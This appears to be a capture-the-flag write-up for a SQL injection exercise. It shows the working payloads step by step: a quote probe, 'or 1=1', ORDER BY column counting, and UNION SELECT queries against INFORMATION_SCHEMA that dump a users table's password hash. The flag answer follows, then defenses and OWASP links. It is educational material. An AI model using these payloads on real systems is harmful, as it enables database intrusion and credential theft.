# SQL Injection Definition

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

# STEPS

## First Step:

Let's check input data is vulnerable of sql injection by sending single quote.  
Output:  
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1`

## Second Step:

Now when we find that input data is vulnerable let's try to guest what they querying on this specific input.  
Let's try to send a 1 as id and see the output  
Output:

```
ID: 1
First name: Barack Hussein
Surname : Obama
```

Now let's try to select all rows by sending `1 or 1=1`  
Output:

```
ID: 1 or 1=1
First name: Barack Hussein
Surname : Obama
ID: 1 or 1=1
First name: Adolf
Surname : Hitler
ID: 1 or 1=1
First name: Joseph
Surname : Staline
ID: 1 or 1=1
First name: Flag
Surname : GetThe
```

Let's now use `UNION`, What's UNION Operator ?  
The UNION operator is used to combine the result-set of two or more SELECT statements.  
But to work UNION properly we must follow those conditions:

- Every SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
<!-- - The columns in every SELECT statement must also be in the same order -->

### Condition 1:

Let's find out how many columns they selected by using `order by`  
Usage of order by:

```
order by (column_name or index_of_selected_column)
```

We don't know column_name so we'll use `index_of_selected_column`  
order by 1 and order by 2 work perfectly as expected, but after using order by 3 it's return error. so we now know that we have two columns.

### Condition 2:

From the result we can see that both two columns is string

Now let's select current database

```
1 UNION SELECT NULL,DATABASE() // Member_Sql_Injection
```

And now let's try to find name of tables that databases have by sending this query

```
1 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x4d656d6265725f53716c5f496e6a656374696f6e
```

```
INFORMATION_SCHEMA: provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column
TABLE_SCHEMA: The name of the schema (database) to which the table belongs
TABLE_NAME: The name of the table
// 0x4d656d6265725f53716c5f496e6a656374696f6e = Member_Sql_Injection
```

We find that database have just one tables (users)  
Now let's search for all columns names of this table

```
1 UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME=0x7573657273
```

### [Columns]

```
user_id
first_name
last_name
town
country
planet
Commentaire
countersign
```

After searching all the columns we find that `countersign` contain password and `Commentaire` contain description of password

```
ID: 1 UNION SELECT countersign,Commentaire FROM Member_Sql_Injection.users
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

After decrypt password and lower it thant hash it we'll get the flag

```
5ff9d0165b4f92b14994e5c685cdce28 = FortyTwo
fortytwo = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Flag : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Defenses

### Defense 1: Prepared Statements (with Parameterized Queries)

The use of prepared statements with variable binding (aka parameterized queries) is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.

### Defense 2: Escaping All User-Supplied Input

This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations.

# Resources

### [SQL Injection OWASP](https://owasp.org/www-community/attacks/SQL_Injection)

### [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### [SQL Injection Exercise 1](https://www.hacksplaining.com/exercises/sql-injection)

### [SQL Injection Exercise 2](https://application.security/free-application-security-training/owasp-top-10-sql-injection)
